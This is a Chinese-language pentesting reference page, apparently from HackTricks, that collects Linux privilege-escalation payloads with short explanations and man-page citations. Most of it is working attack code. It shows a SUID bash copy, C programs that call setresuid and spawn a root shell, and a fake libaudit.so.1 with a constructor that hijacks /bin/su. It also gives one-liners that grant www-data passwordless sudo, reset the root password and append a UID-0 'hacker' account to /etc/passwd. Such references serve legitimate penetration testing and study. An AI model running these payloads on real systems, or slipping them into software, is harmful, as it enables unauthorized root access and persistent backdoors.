# 要执行的 Payload

{{#include ../../banners/hacktricks-training.md}}

## Bash

`bash -p` 启用 privileged mode：当 Bash 以不同的实际 ID 和有效 ID 启动时，不会将有效 ID 重置为实际 ID。生成的 shell 仍取决于调用者现有的凭据。<sup>[[1]](#references)[[3]](#references)</sup>
```bash
cp /bin/bash /tmp/b && chmod +s /tmp/b
/bin/b -p #Maintains root privileges from suid, working in debian & buntu
```
## C

`setresuid` 在获得许可时会更改真实、有效和保存的 ID，而 `setuid` 会更改有效 ID；对于特权调用者，它还可能设置真实和保存的 ID。`execve` 会将当前进程映像替换为请求的程序。<sup>[[2]](#references)[[3]](#references)[[4]](#references)</sup>这些示例省略了返回值检查；即使 UID 为 0，两个 credential 调用也可能失败。<sup>[[2]](#references)[[3]](#references)</sup>
```c
//gcc payload.c -o payload
int main(void){
setresuid(0, 0, 0); //Set as user suid user
system("/bin/sh");
return 0;
}
```

```c
//gcc payload.c -o payload
#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>

int main(){
setuid(getuid());
system("/bin/bash");
return 0;
}
```

```c
// Privesc to user id: 1000
#define _GNU_SOURCE
#include <stdlib.h>
#include <unistd.h>

int main(void) {
char *const paramList[10] = {"/bin/bash", "-p", NULL};
const int id = 1000;
setresuid(id, id, id);
execve(paramList[0], paramList, NULL);
return 0;
}
```
## 覆盖文件以提升权限

### 常见文件

以下是常见的本地权限控制文件和接口：`/etc/passwd` 存储七字段账户记录，`/etc/shadow` 存储可选的加密密码数据，`sudoers` 定义 sudo 权限以及 `NOPASSWD` 等标签，而 Docker 的默认 daemon endpoint 是位于 `/var/run/docker.sock` 的 Unix socket；访问该 socket 可能授予对其主机的 root 级控制权。<sup>[[5]](#references)[[6]](#references)[[7]](#references)[[8]](#references)</sup>

- 在 _/etc/passwd_ 中添加带密码的用户
- 在 _/etc/shadow_ 中修改密码
- 在 _/etc/sudoers_ 中将用户添加到 sudoers
- 通过 docker socket 滥用 Docker，通常位于 _/run/docker.sock_ 或 _/var/run/docker.sock_

### 覆盖 library

检查 binary 使用的 shared libraries；在此示例中，使用 `ldd` 检查 `/bin/su`。<sup>[[9]](#references)</sup>
```bash
ldd /bin/su
linux-vdso.so.1 (0x00007ffef06e9000)
libpam.so.0 => /lib/x86_64-linux-gnu/libpam.so.0 (0x00007fe473676000)
libpam_misc.so.0 => /lib/x86_64-linux-gnu/libpam_misc.so.0 (0x00007fe473472000)
libaudit.so.1 => /lib/x86_64-linux-gnu/libaudit.so.1 (0x00007fe473249000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fe472e58000)
libdl.so.2 => /lib/x86_64-linux-gnu/libdl.so.2 (0x00007fe472c54000)
libcap-ng.so.0 => /lib/x86_64-linux-gnu/libcap-ng.so.0 (0x00007fe472a4f000)
/lib64/ld-linux-x86-64.so.2 (0x00007fe473a93000)
```
`ldd` 报告 shared-object 依赖关系，而 dynamic linker 使用 ELF metadata 及其搜索规则在运行时加载它们。<sup>[[9]](#references)[[10]](#references)</sup>

要检查某个候选项，请使用 `objdump -T` 输出 `su` 的 dynamic symbol table，并筛选 audit names。<sup>[[11]](#references)</sup>
```bash
objdump -T /bin/su | grep audit
0000000000000000      DF *UND*  0000000000000000              audit_open
0000000000000000      DF *UND*  0000000000000000              audit_log_user_message
0000000000000000      DF *UND*  0000000000000000              audit_log_acct_message
000000000020e968 g    DO .bss   0000000000000004  Base        audit_fd
```
`audit_open`、`audit_log_user_message` 和 `audit_log_acct_message` 是 libaudit 函数；在此输出中，`audit_fd` 显示为定义于 `su` 的 `.bss` 中的数据对象。<sup>[[12]](#references)[[13]](#references)[[14]](#references)</sup> 替换库必须为 loader 解析的 undefined symbols 导出兼容的定义；不匹配的函数/数据 ABI 仍可能导致进程在这些 symbols 被重定位或调用时失败。<sup>[[10]](#references)[[11]](#references)</sup>

GCC 的 `constructor` attribute 会使 `inject` 在受支持的 targets 上于 `main` 之前自动调用。<sup>[[15]](#references)</sup>
```c
#include<stdio.h>
#include<stdlib.h>
#include<unistd.h>

//gcc -shared -o /lib/x86_64-linux-gnu/libaudit.so.1 -fPIC inject.c

int audit_open;
int audit_log_acct_message;
int audit_log_user_message;
int audit_fd;

void inject()__attribute__((constructor));

void inject()
{
setuid(0);
setgid(0);
system("/bin/bash");
}
```
如果替换内容被具有特权的 **`/bin/su`** 进程成功加载，该 constructor 可以使用该进程的权限启动 **`/bin/bash`**；确切结果取决于环境。<sup>[[10]](#references)[[15]](#references)</sup>

## 脚本

你能让 root 执行某些内容吗？

`sudoers` 在策略条目中使用 `NOPASSWD` 标签，`chpasswd` 从标准输入读取 `user:password` 对，而 `/etc/passwd` 使用七个以冒号分隔的账户字段；以下示例假设运行这些命令的进程可以写入相关文件。<sup>[[5]](#references)[[6]](#references)[[16]](#references)</sup>

### **www-data to sudoers**
```bash
echo 'chmod 777 /etc/sudoers && echo "www-data ALL=NOPASSWD:ALL" >> /etc/sudoers && chmod 440 /etc/sudoers' > /tmp/update
```
### **更改 root 密码**
```bash
echo "root:hacked" | chpasswd
```
### 将新 root 用户添加到 /etc/passwd

最终 payload 取决于目标是否接受生成的 `crypt` hash：Debian 的 `mkpasswd -m sha-512` 映射到 SHA-512 crypt（`$6$`），而 OpenSSL 的 `passwd -1 -salt` 使用基于 MD5 的 BSD algorithm（`$1$`）。<sup>[[17]](#references)[[18]](#references)</sup>
```bash
echo hacker:$((mkpasswd -m SHA-512 myhackerpass || openssl passwd -1 -salt mysalt myhackerpass || echo '$1$mysalt$7DTZJIc9s6z60L6aj0Sui.') 2>/dev/null):0:0::/:/bin/bash >> /etc/passwd
```
## References

- [1] [Set 内置命令（Bash Reference Manual）](https://www.gnu.org/s/bash/manual/html_node/The-Set-Builtin.html)
- [2] [setresuid(2) — Linux 手册页](https://man7.org/linux/man-pages/man2/setresuid.2.html)
- [3] [setuid(2) — Linux 手册页](https://man7.org/linux/man-pages/man2/setuid.2.html)
- [4] [execve(2) — Linux 手册页](https://man7.org/linux/man-pages/man2/execve.2.html)
- [5] [passwd(5) — Linux 手册页](https://man7.org/linux/man-pages/man5/passwd.5.html)
- [6] [sudoers(5) — Debian 手册页](https://manpages.debian.org/testing/sudo/sudoers.5.en.html)
- [7] [保护 Docker daemon socket](https://docs.docker.com/engine/security/protect-access/)
- [8] [dockerd — Docker 文档](https://docs.docker.com/reference/cli/dockerd/)
- [9] [ldd(1) — Linux 手册页](https://man7.org/linux/man-pages/man1/ldd.1.html)
- [10] [ld.so(8) — Linux 手册页](https://man7.org/linux/man-pages/man8/ld.so.8.html)
- [11] [objdump（GNU 二进制工具）](https://sourceware.org/binutils/docs/binutils/objdump.html)
- [12] [audit_open(3) — Debian 手册页](https://manpages.debian.org/trixie/libaudit-dev/audit_open.3.en.html)
- [13] [audit_log_user_message(3) — Debian 手册页](https://manpages.debian.org/testing/libaudit-dev/audit_log_user_message.3.en.html)
- [14] [audit_log_acct_message(3) — Debian 手册页](https://manpages.debian.org/testing/libaudit-dev/audit_log_acct_message.3.en.html)
- [15] [通用属性（使用 GNU Compiler Collection）](https://gcc.gnu.org/onlinedocs/gcc/Common-Attributes.html)
- [16] [chpasswd(8) — Linux 手册页](https://man7.org/linux/man-pages/man8/chpasswd.8.html)
- [17] [mkpasswd.c — Debian 源代码](https://sources.debian.org/src/whois/5.5.17/mkpasswd.c)
- [18] [openssl-passwd — OpenSSL 文档](https://docs.openssl.org/master/man1/openssl-passwd/)
{{#include ../../banners/hacktricks-training.md}}
